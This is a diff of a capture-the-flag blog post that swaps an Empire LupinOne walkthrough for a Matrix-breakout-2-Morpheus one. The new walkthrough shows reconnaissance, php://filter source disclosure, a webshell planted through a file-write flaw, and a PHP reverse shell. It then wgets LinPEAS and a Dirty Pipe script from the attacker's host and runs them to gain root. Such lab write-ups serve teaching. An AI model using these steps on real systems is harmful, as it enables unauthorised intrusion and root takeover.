@@ -1,216 +1,376 @@
-# Vulnhub Empire LupinOne
+# Vulnhub Matrix-breakout-2-Morpheus
 
 
-Vulnhub Training Waklthrough -- Empire LupinOne
+Vulnhub Training Walkthrough -- Matrix-breakout-2-Morpheus
 
 <!--more-->
 
 ## Knowledge
 
-- ffuf -- find secret file
-- base58 encode
-- dirty_pipe privilege eslacation
-- linpeas -- a script that search for possible paths to escalate privileges on Linux/Unix\*/MacOS hosts
-- [Python Library Hijacking](https://www.hackingarticles.in/linux-privilege-escalation-python-library-hijacking/)
-- Privilege Eslacation with pip
+- LFI -- Local File Include
+- LinPEAS -- 
+- Dirty-Pipe CVE-2022-0847
+- php://filter
 
 ## 1. Environment Setup
 
-Download the [zip file](https://download.vulnhub.com/empire/01-Empire-Lupin-One.zip), extract it and import into VMware or VirtualBox.
+Download the [OVA file](https://download.vulnhub.com/matrix-breakout/matrix-breakout-2-morpheus.ova), import into VMware and just run.
 
 ## 2. Reconnaisence
 
 ### 1. IP Address
 
-arp-scan to scan the ip addr:
+arp-scan scanner:
 
 ```shell
-┌──(v4ler1an㉿kali)-[/usr/share/seclists/Discovery/Web-Content]
+┌──(v4ler1an㉿kali)-[~]
 └─$ sudo arp-scan -l
 [sudo] password for v4ler1an:
 Interface: eth0, type: EN10MB, MAC: 00:0c:29:9d:5b:9e, IPv4: 172.16.86.138
+WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied
+WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied
 Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
 172.16.86.1	5e:52:30:c9:b7:65	(Unknown: locally administered)
-172.16.86.2	00:50:56:fd:f8:ec	VMware, Inc.
-172.16.86.148	00:0c:29:c2:93:45	VMware, Inc.
-172.16.86.254	00:50:56:fa:b5:64	VMware, Inc.
+172.16.86.2	00:50:56:fd:f8:ec	(Unknown)
+172.16.86.153	00:0c:29:f6:3b:cd	(Unknown)
+172.16.86.254	00:50:56:ed:8a:52	(Unknown)
 
-8 packets received by filter, 0 packets dropped by kernel
-Ending arp-scan 1.10.0: 256 hosts scanned in 2.405 seconds (106.44 hosts/sec). 4 responded
+4 packets received by filter, 0 packets dropped by kernel
+Ending arp-scan 1.10.0: 256 hosts scanned in 2.250 seconds (113.78 hosts/sec). 4 responded
 ```
+
+Target IP is 172.16.86.152.
 
 ### 2. Port Info
 
-nmap scan:
+Scan the port and service:
 
 ```shell
-┌──(v4ler1an㉿kali)-[/usr/share/seclists/Discovery/Web-Content]
-└─$ nmap -T4 -A -Pn 172.16.86.148
-Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-11-13 03:03 EST
-Nmap scan report for 172.16.86.148
-Host is up (0.0019s latency).
-Not shown: 998 closed tcp ports (conn-refused)
+┌──(v4ler1an㉿kali)-[~]
+└─$ nmap -T4 -p- -sC -sV -sT -A -Pn 172.16.86.153
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-11-14 21:14 EST
+Nmap scan report for 172.16.86.153
+Host is up (0.00033s latency).
+Not shown: 65532 closed tcp ports (conn-refused)
 PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
 | ssh-hostkey:
-|   3072 ed:ea:d9:d3:af:19:9c:8e:4e:0f:31:db:f2:5d:12:79 (RSA)
-|   256 bf:9f:a9:93:c5:87:21:a3:6b:6f:9e:e6:87:61:f5:19 (ECDSA)
-|_  256 ac:18:ec:cc:35:c0:51:f5:6f:47:74:c3:01:95:b4:0f (ED25519)
-80/tcp open  http    Apache httpd 2.4.48 ((Debian))
-|_http-title: Site doesn't have a title (text/html).
-| http-robots.txt: 1 disallowed entry
-|_/~myfiles
-|_http-server-header: Apache/2.4.48 (Debian)
+|_  256 aa:83:c3:51:78:61:70:e5:b7:46:9f:07:c4:ba:31:e4 (ECDSA)
+80/tcp open  http    Apache httpd 2.4.51 ((Debian))
+|_http-server-header: Apache/2.4.51 (Debian)
+|_http-title: Morpheus:1
+81/tcp open  http    nginx 1.18.0
+|_http-server-header: nginx/1.18.0
+| http-auth:
+| HTTP/1.1 401 Unauthorized\x0D
+|_  Basic realm=Meeting Place
+|_http-title: 401 Authorization Required
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 6.55 seconds
+Nmap done: 1 IP address (1 host up) scanned in 12.33 seconds
 ```
 
-Enable port info:
+Port and service:
 
-| port | service  |
-| ---- | -------- |
-| 22   | ssh      |
-| 80   | http web |
+| port | service             |
+| ---- | ------------------- |
+| 22   | ssh                 |
+| 80   | Apache httpd 2.4.51 |
+| 81   | nginx 1.18.0        |
 
-nmap result display a robots.txt file, access:
+Access the 80 webpage:
+
+![image-20231115102052270](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311151020427.png)
+
+The source of page is:
 
 ```shell
-┌──(v4ler1an㉿kali)-[/usr/share/seclists/Discovery/Web-Content]
-└─$ curl http://172.16.86.148/robots.txt
-User-agent: *
-Disallow: /~myfiles
+<html>
+	<head><title>Morpheus:1</title></head>
+	<body>
+		Welcome to the Boot2Root CTF, Morpheus:1.
+		<p>
+		You play Trinity, trying to investigate a computer on the 
+		Nebuchadnezzar that Cypher has locked everyone else out of, at least for ssh.
+		<p>
+		Good luck!
 
-┌──(v4ler1an㉿kali)-[/usr/share/seclists/Discovery/Web-Content]
-└─$ curl http://172.16.86.148/~myfiles
-<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
-<html><head>
-<title>301 Moved Permanently</title>
-</head><body>
-<h1>Moved Permanently</h1>
-<p>The document has moved <a href="http://172.16.86.148/~myfiles/">here</a>.</p>
-<hr>
-<address>Apache/2.4.48 (Debian) Server at 172.16.86.148 Port 80</address>
-</body></html>
+		- @jaybeale from @inguardians
+		<p>
+		<img src="trinity.jpeg">
+	</body>
+</html>
+
 ```
 
-![image-20231113161407265](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311131614422.png)
+The picture is normal.
 
-And can not access `~myfiles`, but it give us a hint sting, keep a mind in it.
+Access the 81 port:
+
+![image-20231115102156307](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311151021400.png)
+
+Has a login page, but we have no name and password. The username maybe is `Trinity` or `Cypher`.
 
 ### 3. Web Directory
 
-Let us scan the web directory:
+Scan the web directory:
 
 ```shell
-┌──(v4ler1an㉿kali)-[/usr/share/seclists/Discovery/Web-Content]
-└─$ gobuster dir -u http://172.16.86.148:80/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+┌──(v4ler1an㉿kali)-[~]
+└─$ gobuster dir -u http://172.16.86.153 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -x php,bak,txt,html -t 60
 ===============================================================
 Gobuster v3.6
 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 ===============================================================
-[+] Url:                     http://172.16.86.148:80/
+[+] Url:                     http://172.16.86.153
 [+] Method:                  GET
-[+] Threads:                 10
-[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Threads:                 60
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 [+] Negative Status codes:   404
 [+] User Agent:              gobuster/3.6
+[+] Extensions:              php,bak,txt,html
 [+] Timeout:                 10s
 ===============================================================
 Starting gobuster in directory enumeration mode
 ===============================================================
-/image                (Status: 301) [Size: 314] [--> http://172.16.86.148/image/]
-/manual               (Status: 301) [Size: 315] [--> http://172.16.86.148/manual/]
-/javascript           (Status: 301) [Size: 319] [--> http://172.16.86.148/javascript/]
+/.php                 (Status: 403) [Size: 278]
+/index.html           (Status: 200) [Size: 348]
+/.html                (Status: 403) [Size: 278]
+/javascript           (Status: 301) [Size: 319] [--> http://172.16.86.153/javascript/]
+/robots.txt           (Status: 200) [Size: 47]
+/graffiti.txt         (Status: 200) [Size: 139]
+/graffiti.php         (Status: 200) [Size: 451]
+/.html                (Status: 403) [Size: 278]
+/.php                 (Status: 403) [Size: 278]
 /server-status        (Status: 403) [Size: 278]
-Progress: 220560 / 220561 (100.00%)
+Progress: 1102800 / 1102805 (100.00%)
 ===============================================================
 Finished
 ===============================================================
 ```
 
-Nothing useful.
+We can find `robots.txt`, `graffiti.txt` and `graffiti.php` file, just look at it.
+
+```shell
+┌──(v4ler1an㉿kali)-[~/Documents/tmp]
+└─$ curl http://172.16.86.153/robots.txt
+There's no white rabbit here.  Keep searching!
+                                                                              
+┌──(v4ler1an㉿kali)-[~/Documents/tmp]
+└─$ curl http://172.16.86.153/graffiti.txt
+Mouse here - welcome to the Nebby!
+
+Make sure not to tell Morpheus about this graffiti wall.
+It's just here to let us blow off some steam.
+
+```
+
+![image-20231115142554473](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311151425610.png)
+
+We found a message input box.
 
 ## 3. Exploit
 
-### 1. Look for ssh private key
+Now, let's test `graffiti.php` with burp:
 
-Ok, return the `~myfiles`, let's fuzz the path of it:
+![image-20231115142725188](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311151427316.png)
 
-```shell
-┌──(v4ler1an㉿kali)-[/usr/share/seclists/Discovery/Web-Content]
-└─$ ffuf -ic -c -r -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 'http://172.16.86.148/~FUZZ' -fs 138
+As we can see, when we text in message box, the server will return the `graffiti.txt` file, and what we input in message box will be accour here. So, here has a LFI vulnerability.
 
-        /'___\  /'___\           /'___\
-       /\ \__/ /\ \__/  __  __  /\ \__/
-       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
-        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
-         \ \_\   \ \_\  \ \____/  \ \_\
-          \/_/    \/_/   \/___/    \/_/
+### 1. LFI
 
-       v2.1.0-dev
-________________________________________________
+We can check out the `graffiti.php ` source code with php:filter through the LFI:
 
- :: Method           : GET
- :: URL              : http://172.16.86.148/~FUZZ
- :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
- :: Follow redirects : true
- :: Calibration      : false
- :: Timeout          : 10
- :: Threads          : 40
- :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
- :: Filter           : Response size: 138
-________________________________________________
+![image-20231115143317154](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311151433288.png)
 
-secret                  [Status: 200, Size: 331, Words: 52, Lines: 6, Duration: 7ms]
-:: Progress: [220547/220547] :: Job [1/1] :: 7407 req/sec :: Duration: [0:00:35] :: Errors: 0 ::
-```
-
-Well done, we found a secret file:
-
-![image-20231113162118334](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311131621470.png)
-
-Fine, we need to find out the ssh private key file. As we all know, the ssh private key named `.[key_file]`, so we should fuzz `~secret/.[file]`:
+Decode with base64 and then got the source code:
 
 ```shell
-┌──(v4ler1an㉿kali)-[/usr/share/seclists/Discovery/Web-Content]
-└─$ ffuf -ic -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u 'http://172.16.86.148/~secret/.FUZZ' -mc 200,301 -e .txt,.html -t 60
+<?php
 
-        /'___\  /'___\           /'___\
-       /\ \__/ /\ \__/  __  __  /\ \__/
-       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
-        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
-         \ \_\   \ \_\  \ \____/  \ \_\
-          \/_/    \/_/   \/___/    \/_/
+$file="graffiti.txt";
+if($_SERVER['REQUEST_METHOD'] == 'POST') {
+    if (isset($_POST['file'])) {
+       $file=$_POST['file'];
+    }
+    if (isset($_POST['message'])) {
+        $handle = fopen($file, 'a+') or die('Cannot open file: ' . $file);
+        fwrite($handle, $_POST['message']);
+	fwrite($handle, "\n");
+        fclose($file); 
+    }
+}
 
-       v2.1.0-dev
-________________________________________________
-
- :: Method           : GET
- :: URL              : http://172.16.86.148/~secret/.FUZZ
- :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
- :: Extensions       : .txt .html
- :: Follow redirects : false
- :: Calibration      : false
- :: Timeout          : 10
- :: Threads          : 60
- :: Matcher          : Response status: 200,301
-________________________________________________
-
-                        [Status: 200, Size: 331, Words: 52, Lines: 6, Duration: 19ms]
-                        [Status: 200, Size: 331, Words: 52, Lines: 6, Duration: 5ms]
-mysecret.txt            [Status: 200, Size: 4689, Words: 1, Lines: 2, Duration: 3ms]
-:: Progress: [661641/661641] :: Job [1/1] :: 9090 req/sec :: Duration: [0:01:30] :: Errors: 0 ::
+// Display file
+$handle = fopen($file,"r");
+while (!feof($handle)) {
+  echo fgets($handle);
+  echo "<br>\n";
+}
+fclose($handle);
+?>
 ```
 
-Let's access the file:
+We fill the `file` parameter with `php://filter/read=convert.base64-encode/resource=graffiti.php`, and we got the source code of `graffiti.php`.
+
+### 2. Upload the webshell
+
+In the source code of `graffiti.php`, we can find that the `$file` variable with replaced with the POST's parameter `file`, and then write the `message` we inputed into the `file`. So, we can use it write a webshell here:
+
+![image-20231115144010659](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311151440825.png)
+
+And then connect it with AntSword:
+
+![image-20231115144659387](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311151446555.png)
+
+### 3. Get the reverse shell
+
+And then we user a php reverse shell to get shell:
+
+![image-20231115150726321](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311151507489.png)
+
+And then switch the shell by python:
 
 ```shell
-┌──(v4ler1an㉿kali)-[~/Documents/tools/scan/wfuzz]
-└─$ curl  http://172.16.86.148/~secret/.mysecret.txt
-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
+$ python3 -c 'import pty;pty.spawn("/bin/bash")';
+www-data@morpheus:/$ id
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+www-data@morpheus:/$ ls
+ls
+FLAG.txt  boot	dev  home  lib32  libx32      media  opt   root  sbin  sys  usr
+bin	  crew	etc  lib   lib64  lost+found  mnt    proc  run	 srv   tmp  var
+www-data@morpheus:/$ cat FLAG.txt
+cat FLAG.txt
+Flag 1!
+
+You've gotten onto the system.  Now why has Cypher locked everyone out of it?
+
+Can you find a way to get Cypher's password? It seems like he gave it to
+Agent Smith, so Smith could figure out where to meet him.
+
+Also, pull this image from the webserver on port 80 to get a flag.
+
+/.cypher-neo.png
 ```
+
+## 4. Privilege Escalation
+
+Now, we need to get root. We can find two user in home:
+
+```shell
+www-data@morpheus:/$ ls /home
+ls /home
+cypher	trinity
+www-data@morpheus:/$ find / -user cypher -type f 2>/dev/null
+find / -user cypher -type f 2>/dev/null
+/FLAG.txt
+www-data@morpheus:/$ find / -user trinity -type f 2>/dev/null
+find / -user trinity -type f 2>/dev/null
+/home/trinity/.bash_logout
+/home/trinity/.bashrc
+/home/trinity/.profile
+```
+
+Nothing useful. Let's use LinPEAS:
+
+```shell
+www-data@morpheus:/var/www/html$ wget http://172.16.86.138:8080/LinPEAS.sh
+wget http://172.16.86.138:8080/LinPEAS.sh
+--2023-11-15 06:35:55--  http://172.16.86.138:8080/LinPEAS.sh
+Connecting to 172.16.86.138:8080... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 847815 (828K) [text/x-sh]
+Saving to: ‘LinPEAS.sh’
+
+LinPEAS.sh          100%[===================>] 827.94K  --.-KB/s    in 0.04s
+
+2023-11-15 06:35:55 (22.5 MB/s) - ‘LinPEAS.sh’ saved [847815/847815]
+
+www-data@morpheus:/var/www/html$ ls
+ls
+LinPEAS.sh    graffiti.txt  php_reverse_shell.php  shell.php
+graffiti.php  index.html    robots.txt		   trinity.jpeg
+www-data@morpheus:/var/www/html$ ls -la
+ls -la
+total 1284
+drwxr-xr-x 2 www-data www-data   4096 Nov 15 06:35 .
+drwxr-xr-x 3 root     root       4096 Oct 28  2021 ..
+-rw-r--r-- 1 www-data www-data 381359 Oct 28  2021 .cypher-neo.png
+-rw-rw-rw- 1 www-data www-data 847815 Nov 15  2023 LinPEAS.sh
+-rw-r--r-- 1 www-data www-data    778 Nov 15 05:34 graffiti.php
+-rw-r--r-- 1 www-data www-data    181 Nov 15 05:29 graffiti.txt
+-rw-r--r-- 1 www-data www-data    348 Oct 28  2021 index.html
+-rw-r--r-- 1 www-data www-data   5495 Nov 15  2023 php_reverse_shell.php
+-rw-r--r-- 1 www-data www-data     47 Oct 28  2021 robots.txt
+-rw-r--r-- 1 www-data www-data     31 Nov 15 05:41 shell.php
+-rw-r--r-- 1 www-data www-data  44297 Oct 28  2021 trinity.jpeg
+www-data@morpheus:/var/www/html$ chmod +x LinPEAS.sh
+chmod +x LinPEAS.sh
+
+```
+
+We can find something useful:
+
+![image-20231115155130030](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311151551250.png)
+
+We can use Dirty-Pipe to get root. The [exploit](https://github.com/imfiver/CVE-2022-0847). Download it and then execute:
+
+```shell
+www-data@morpheus:/var/www/html$ wget http://172.16.86.138:8080/dirty_pipe.sh
+wget http://172.16.86.138:8080/dirty_pipe.sh
+--2023-11-15 06:47:08--  http://172.16.86.138:8080/dirty_pipe.sh
+Connecting to 172.16.86.138:8080... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 4855 (4.7K) [text/x-sh]
+Saving to: ‘dirty_pipe.sh’
+
+dirty_pipe.sh       100%[===================>]   4.74K  --.-KB/s    in 0s
+
+2023-11-15 06:47:08 (489 MB/s) - ‘dirty_pipe.sh’ saved [4855/4855]
+
+www-data@morpheus:/var/www/html$ ls -la
+ls -la
+total 1292
+drwxr-xr-x 2 www-data www-data   4096 Nov 15 06:47 .
+drwxr-xr-x 3 root     root       4096 Oct 28  2021 ..
+-rw-r--r-- 1 www-data www-data 381359 Oct 28  2021 .cypher-neo.png
+-rwxrwxrwx 1 www-data www-data 847815 Nov 15  2023 LinPEAS.sh
+-rw-rw-rw- 1 www-data www-data   4855 Nov 15 03:32 dirty_pipe.sh
+-rw-r--r-- 1 www-data www-data    778 Nov 15 05:34 graffiti.php
+-rw-r--r-- 1 www-data www-data    181 Nov 15 05:29 graffiti.txt
+-rw-r--r-- 1 www-data www-data    348 Oct 28  2021 index.html
+-rw-r--r-- 1 www-data www-data   5495 Nov 15  2023 php_reverse_shell.php
+-rw-r--r-- 1 www-data www-data     47 Oct 28  2021 robots.txt
+-rw-r--r-- 1 www-data www-data     31 Nov 15 05:41 shell.php
+-rw-r--r-- 1 www-data www-data  44297 Oct 28  2021 trinity.jpeg
+www-data@morpheus:/var/www/html$ chmod +x dirty_pipe.sh
+chmod +x dirty_pipe.sh
+www-data@morpheus:/var/www/html$ ./dirty_pipe.sh
+./dirty_pipe.sh
+/etc/passwd已备份到/tmp/passwd
+It worked!
+
+# 恢复原来的密码
+rm -rf /etc/passwd
+mv /tmp/passwd /etc/passwd
+root@morpheus:/var/www/html# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+root@morpheus:/var/www/html# ls /root
+ls /root
+FLAG.txt
+root@morpheus:/var/www/html# cat /root/FLAG.txt
+cat /root/FLAG.txt
+You've won!
+
+Let's hope Matrix: Resurrections rocks!
+```
+
+## Attack Path
+
+scann web directory --> analysis php file --> LFI --> upload webshell --> get revers shell --> privilege escalation
 
 ### 2. unpasswd the ssh private key 
 
